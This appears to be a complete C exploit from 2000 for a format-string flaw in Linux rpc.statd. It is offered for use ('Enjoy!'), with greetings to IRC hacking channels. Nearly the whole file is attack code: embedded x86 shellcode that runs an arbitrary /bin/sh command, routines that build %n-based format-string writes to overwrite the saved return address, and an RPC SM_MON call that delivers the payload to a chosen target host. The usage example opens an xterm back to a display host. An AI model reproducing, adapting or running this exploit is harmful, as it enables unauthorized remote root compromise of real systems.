
/*
 * rpc.statd remote root xploit for linux/x86
 * based on the xploit made by drow for linux/PowerPC 
 *
 * Author: Doing, 08/2000
 *
 * NOTE:
 * The guest of the remote address of the saved EIP and local vars 
 * is still a problem. The value showed on the usage worked
 * fine on mi suse with the compiled sources. With gdb and a little
 * patience you should get the address for your distro/version.
 * Some address doesn't work, because they cause a very long result,
 * and the syslog() function overflows itself when parsing the
 * format input :(
 *
 * Greetz to Pascal Bouchareine for that great paper on format bugs :)
 *
 * Y saludos a los canales #phreak y #hacker_novatos del IRC hispano :P
 *
 * Excuse my poor english :-)
 *
 */

#include <sys/types.h>
#include <sys/time.h>
#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <rpc/rpc.h>
#include <rpcsvc/sm_inter.h>
#include <sys/socket.h>

void usage(char *s) {
  printf("rpc.statd xploit for linux/x86 - Doing
<jdoing@bigfoot.com>\n");
  printf("Usage: %s host address command\n", s);
  printf("host\t: the targe host\n");
  printf("address\t: the address of the buffer in function log()\n");
  printf("command\t: command to run remotely\n\n");
  printf("ej:%s 127.0.0.1 0xbffff3d4 \"/usr/X11R6/bin/xterm -ut -display
127.0.0.1:0\"\n\n", s);
  printf("Enjoy!\n");
  exit(0);
}

/*
   shellcode without cr/lf and control caracters
*/
char *code =
"\xeb\x4b\x5e\x89\x76\xac\x83\xee\x20\x8d\x5e\x28\x83\xc6\x20\x89"
"\x5e\xb0\x83\xee\x20\x8d\x5e\x2e\x83\xc6\x20\x83\xc3\x20\x83\xeb"
"\x23\x89\x5e\xb4\x31\xc0\x83\xee\x20\x88\x46\x27\x88\x46\x2a\x83"
"\xc6\x20\x88\x46\xab\x89\x46\xb8\xb0\x2b\x2c\x20\x89\xf3\x8d\x4e"
"\xac\x8d\x56\xb8\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xb0\xff"
"\xff\xff/bin/sh -c ";

char shellcode[4096];

void make_shellcode(char *cdir, char *cmd)
{
  unsigned long dir, ret;
  int c, eat = 14;
  int first_n = 0xc9;
  char tmp[1024];
  int i, i0, i1, i2;
  char *ptr = shellcode;

  memset(shellcode, 0, 4096);

  sscanf(cdir, "%x", &dir);

  ret = dir + 0xd0 - 20; /* put ret address into nop-space :) */ 

  dir += 1028;  /*  dir = address of saved EIP = address of buffer +
1024 bytes of buffer + 4 bytes of SFP */

  ptr = &shellcode[strlen(shellcode)];
  sprintf(ptr, "%c%c%c%c", dir & 0xff, (dir & 0xff00) >> 8,
	 (dir & 0xff0000) >> 16, (dir & 0xff000000) >> 24);
  ptr = &shellcode[strlen(shellcode)];
  sprintf(ptr, "%c%c%c%c", dir & 0xff, (dir & 0xff00) >> 8,
	 (dir & 0xff0000) >> 16, (dir & 0xff000000) >> 24);
  ptr = &shellcode[strlen(shellcode)];
  dir++;
  sprintf(ptr, "%c%c%c%c", dir & 0xff, (dir & 0xff00) >> 8,
	 (dir & 0xff0000) >> 16, (dir & 0xff000000) >> 24);
  ptr = &shellcode[strlen(shellcode)];
  sprintf(ptr, "%c%c%c%c", dir & 0xff, (dir & 0xff00) >> 8,
	 (dir & 0xff0000) >> 16, (dir & 0xff000000) >> 24);
  ptr = &shellcode[strlen(shellcode)];
  dir++;
  sprintf(ptr, "%c%c%c%c", dir & 0xff, (dir & 0xff00) >> 8,
	 (dir & 0xff0000) >> 16, (dir & 0xff000000) >> 24);
  ptr = &shellcode[strlen(shellcode)];
  sprintf(ptr, "%c%c%c%c", dir & 0xff, (dir & 0xff00) >> 8,
	 (dir & 0xff0000) >> 16, (dir & 0xff000000) >> 24);
  ptr = &shellcode[strlen(shellcode)];
  dir++;
  sprintf(ptr, "%c%c%c%c", dir & 0xff, (dir & 0xff00) >> 8,
	 (dir & 0xff0000) >> 16, (dir & 0xff000000) >> 24);
  ptr = &shellcode[strlen(shellcode)];
  sprintf(ptr, "%c%c%c%c", dir & 0xff, (dir & 0xff00) >> 8,
	 (dir & 0xff0000) >> 16, (dir & 0xff000000) >> 24);
  ptr = &shellcode[strlen(shellcode)];

  for ( c = 0; c < eat; c++) {
    sprintf(ptr, "%%x ");
    ptr = &shellcode[strlen(shellcode)];
  }

  i0 = (ret & 0xff);
  if (i0 > first_n)  sprintf(ptr, "%%0%ix%%n", i0 - first_n);
  if (i0 == first_n) sprintf(ptr, "%%n");  
  if (i0 < first_n)  {
    i0 |= 0x0100;
    sprintf(ptr, "%%0%ix%%n", i0 - first_n);
  }
  ptr = &shellcode[strlen(shellcode)];


  i = (ret & 0xff00) >> 8;
  if (i > i0)  sprintf(ptr, "%%0%ix%%n", i - i0);
  if (i == i0) sprintf(ptr, "%%n");
  if (i < i0) {
    i |= 0x0100;
    sprintf(ptr, "%%0%ix%%n", i - i0);
  }
  ptr = &shellcode[strlen(shellcode)];


  i1 = (ret & 0xff0000) >> 16;
  if (i1 > i)  sprintf(ptr, "%%0%ix%%n", i1 - i);
  if (i1 == i) sprintf(ptr, "%%n");
  if (i1 < i) {
    i1 |= 0x0100;
    sprintf(ptr, "%%0%ix%%n", i1 - i);
  }
  ptr = &shellcode[strlen(shellcode)];


  i2 = (ret & 0xff000000) >> 24;
  i2 |= 0x0200; 
  sprintf(ptr, "%%0%ix%%n", i2 - i1);
  ptr = &shellcode[strlen(shellcode)];
  

  for (c = 0; c < 50; c++) {
    sprintf(ptr, "\x90");
    ptr = &shellcode[strlen(shellcode)];
  }
  sprintf(ptr, "%s%s\x00", code, cmd);
}

main(int argc, char *argv[]) {
  CLIENT *cl;
  enum clnt_stat stat;
  struct timeval tm;
  struct mon monreq;
  struct sm_stat_res monres;
  struct hostent *hp;
  struct sockaddr_in target;
  int sd, i;

  if (argc < 4)
    usage(argv[0]);

  make_shellcode(argv[2], argv[3]);

  memset(&monreq, 0, sizeof(monreq));
  monreq.mon_id.my_id.my_name ="localhost";
  monreq.mon_id.my_id.my_prog = 0;
  monreq.mon_id.my_id.my_vers = 0;
  monreq.mon_id.my_id.my_proc = 0;
  monreq.mon_id.mon_name = shellcode;
  
  if ((hp=gethostbyname(argv[1])) == NULL) {
    printf("Can't resolve %s\n", argv[1]);
    exit(0);
  }
  target.sin_family=AF_INET;
  target.sin_addr.s_addr=*(u_long *)hp->h_addr;
  target.sin_port=0;    /* ask portmap */
  sd = RPC_ANYSOCK;

  tm.tv_sec=10;
  tm.tv_usec=0;
  if ((cl=clntudp_create(&target, SM_PROG, SM_VERS, tm, &sd)) == NULL) {
    clnt_pcreateerror("clnt_create");
    exit(0);
  }
  stat=clnt_call(cl, SM_MON, xdr_mon, (char *)&monreq, xdr_sm_stat_res,
                (char *)&monres, tm);
  if (stat != RPC_SUCCESS)
    clnt_perror(cl, "clnt_call");
  else
    printf("stat_res = %d.\n", monres.res_stat);
  clnt_destroy(cl);
}
























































